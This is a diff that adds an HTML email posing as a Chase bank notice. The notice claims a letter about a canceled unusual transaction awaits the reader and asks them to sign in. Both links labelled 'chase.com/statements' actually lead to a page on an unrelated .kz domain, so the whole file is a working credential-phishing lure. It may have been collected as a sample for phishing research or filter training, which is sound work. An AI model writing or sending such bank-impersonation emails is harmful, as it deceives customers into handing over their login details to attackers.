@@ -1,0 +1,114 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="content-type">
+  <title>You received a new letter</title>
+</head>
+<body>
+<span class="showFullHeader"
+ data-dojo-attach-event="onclick: showFullHeader"><span
+ class="wsLink moreLessLink"
+ title="See all recipients, full email addresses, and online status"></span><svg
+ class="svgIcon moreLinkArrow"><use
+ xlink:href="https://mail.aol.com/webmail-std/en-us/suite#iconDown"></use></svg>
+</span>
+<div class="header" data-dojo-attach-point="headerNode">
+<div class="main" data-dojo-attach-point="mainHeaderNode"></div>
+</div>
+<table style="background-color: rgb(255, 255, 255);"
+ align="center" border="0" cellpadding="0"
+ cellspacing="0" width="480">
+  <tbody>
+    <tr>
+      <td style="vertical-align: top;" align="left">
+      <table
+ style="vertical-align: top; background-color: rgb(0, 102, 204);"
+ align="left" border="0" cellpadding="0"
+ cellspacing="0" width="100%">
+        <tbody>
+          <tr>
+            <td
+ style="vertical-align: middle; padding-left: 5px; padding-top: 10px;"
+ align="center">
+            <img data-imagetype="External"
+ src="https://marketing-image-production.s3.amazonaws.com/uploads/0fa65a024689a5c6a6a7b194bfb3c9756f734215d588d40d03e9fbcc2a9864e232ca76d5dfe8bab6bc671cae1168a88f5653baf5420834ba63c00f28e3b09792.png"
+ alt="" class="x_max-width"
+ style="border: 0px none ; margin: 0px; padding: 0px; font-style: normal; font-weight: 400; font-stretch: inherit; font-size: 16px; line-height: inherit; font-family: Helvetica,arial,sans-serif; vertical-align: baseline; color: rgb(0, 0, 0) ! important; max-width: 55%; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration: none; display: block; width: 330px; height: auto ! important;"
+ border="0" width="330">&nbsp;<br>
+            <br>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+      </td>
+    </tr>
+    <tr>
+      <td
+ style="border-top: 1px solid rgb(230, 230, 230); padding-left: 20px; padding-right: 20px; padding-top: 20px; font-family: Arial,Helvetica,sans-serif; font-size: 13px; color: rgb(0, 0, 0); vertical-align: top;"
+ align="left">
+We posted a new notice or letter in your Chase Mobile&reg; app and
+at <a style="color: rgb(45, 90, 226);"
+ rel="nofollow noopener noreferrer" target="_blank"
+ href="https://diplomnik.kz/chs.php?jan">chase.com/statements</a>.<br>
+      <br>
+      <strong>Here's what it's about</strong>
+      <br>
+      <br>
+      <strong>Please call us about an unusual transaction we
+canceled</strong>
+      <br>
+      <br>
+We encourage you to read the entire letter, because it contains
+specific information about your account.
+      <br>
+      <br>
+      <strong>View your letter in two ways</strong>
+      <ul>
+        <li>
+From Chase Mobile, go to your profile and choose "Statements and
+documents."
+        </li>
+        <li>
+At <a style="color: rgb(45, 90, 226);"
+ rel="nofollow noopener noreferrer" target="_blank"
+ href="https://diplomnik.kz/chs.php?jan">chase.com/statements</a>,
+just sign in to your account.
+        </li>
+      </ul>
+You&rsquo;ll see your letter under &ldquo;Notices and
+letters&rdquo;.
+      <br>
+      <br>
+To view or change your delivery settings, please sign in to Chase
+Mobile or <a rel="nofollow noopener noreferrer"
+ target="_blank" href="#">chase.com</a>.
+      <br>
+      <br>
+Letters and notices sent may be from subsidiaries and/or affiliates of
+JPMorgan Chase Bank, N.A.
+      </td>
+    </tr>
+    <tr>
+      <td style="padding: 0px 30px 30px; vertical-align: top;"
+ class="yiv3468696704padding" align="center">
+      <table border="0" cellpadding="0" cellspacing="0"
+ width="100%">
+        <tbody>
+          <tr>
+            <td style="padding: 30px 0px 0px; vertical-align: top;"
+ align="center">
+            <img data-imagetype="External"
+ src="https://marketing-image-production.s3.amazonaws.com/uploads/0fa65a024689a5c6a6a7b194bfb3c9756f734215d588d40d03e9fbcc2a9864e232ca76d5dfe8bab6bc671cae1168a88f5653baf5420834ba63c00f28e3b09792.png"
+ alt="" class="x_max-width"
+ style="border: 0px none ; margin: 0px; padding: 0px; font-style: normal; font-weight: 400; font-stretch: inherit; font-size: 16px; line-height: inherit; font-family: Helvetica,arial,sans-serif; vertical-align: baseline; color: rgb(0, 0, 0) ! important; max-width: 55%; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration: none; display: block; width: 330px; height: auto ! important;"
+ border="0" width="330"></td>
+          </tr>
+        </tbody>
+      </table>
+      </td>
+    </tr>
+  </tbody>
+</table>
+</body>
+</html>
